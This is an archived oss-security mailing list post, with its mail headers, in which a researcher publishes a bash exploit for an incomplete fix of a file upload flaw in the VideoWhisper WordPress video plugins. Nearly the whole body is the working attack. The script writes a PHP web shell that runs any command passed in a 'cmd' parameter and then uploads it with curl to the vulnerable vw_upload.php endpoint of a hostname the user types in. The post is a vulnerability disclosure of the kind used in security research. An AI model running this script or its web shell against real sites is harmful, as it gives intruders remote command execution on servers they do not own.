X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1779" "Saturday" "18" "April" "2015" "06:06:13" "-0700" "Larry W. Cashdollar" "larry0@me.com" "<CB7CD3E4-7045-496E-AEBF-7DE0F6B73615@me.com>" "60" "[oss-security] Exploit for VideoWhisper WP plugins file upload incomplete fix." nil nil nil "4" "2015041813:06:13" "[oss-security] Exploit for VideoWhisper WP plugins file upload incomplete fix." (number mark "        larry0@me.co Apr 18   60/1779  " thread-indent "\"[oss-security] Exploit for VideoWhisper WP plugins file upload incomplete fix.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 5145 invoked by uid 550); 18 Apr 2015 13:07:06 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 4085 invoked from network); 18 Apr 2015 13:07:01 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.13.68,1.0.33,0.0.0000
 definitions=2015-04-18_01:2015-04-17,2015-04-18,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1504180117
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <CB7CD3E4-7045-496E-AEBF-7DE0F6B73615@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2070.6\))
X-Mailer: Apple Mail (2.2070.6)
Date: Sat, 18 Apr 2015 06:06:13 -0700
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Exploit for VideoWhisper WP plugins file upload incomplete fix.
To: Open Source Security <oss-security@lists.openwall.com>

#!/bin/bash
#A quick Exploit for the VideoWhisper file upload incomplete fix I posted a=
 few weeks ago.
#Larry W. Cashdollar v1.0

cat > shell.pht << -EOF-
<?php
if(isset(\$_REQUEST[=E2=80=98cmd=E2=80=99])){
        echo "<pre>";
        \$cmd =3D (\$_REQUEST[=E2=80=98cmd=E2=80=99]);
        system(\$cmd);
        echo "</pre>";
} else { echo "Please supply a command cmd"; }
?>
-EOF-

red=3D'\033[0;31m'
NC=3D'\033[0m' # No Color

while [ true ]; do=20
echo -e ${red};
echo -e "				VideoWhisper Remote File Upload PoC Redux $NC";
echo "						4/14/2015";
echo "					   Larry W. Cashdollar, @_larry0";
echo
echo
echo "Linux OSs like Debian or Ubuntu have .phtml, .pht defined as";
echo "SetHandler application/x-httpd-php in php5.conf";
echo "So WP instances hosted on thos OSs are still vulnerable to CVE-2014-1=
905";
echo "and bid 53851.";
echo "		     - Advisories -";
echo "http://www.vapid.dhs.org/blog/04-16-2015/";
echo "http://www.vapid.dhs.org/advisory.php?v=3D116";
echo "http://www.vapid.dhs.org/advisory.php?v=3D117";
echo=20
echo
echo "Ctrl ^C to exit";
echo -n "Enter Target Hostname :";
read target;
echo -n "Enter 1 for integration 2 for presentation :";
read plugin;
echo -n "Enter payload filename or (shell.pht):";
read file;
echo "[+] Hostname $target";
echo "[+] File $file";
if [ $plugin =3D=3D 1 ]; then
echo "[+] Targeting Video Conference Plugin";
echo
	curl --form "vw_file=3D@$file" --form "name=3D$file" --form "room=3D./" ht=
tp://$target/wp-content/plugins/videowhisper-video-conference-integration/v=
c/vw_upload.php
else
echo "[+] Targeting Video Presentation Plugin";
echo
	curl --form "vw_file=3D@$file" --form "name=3D$file" --form "room=3D./" ht=
tp://$target/wp-content/plugins/videowhisper-video-presentation/vp/vw_uploa=
d.php
fi;
done=
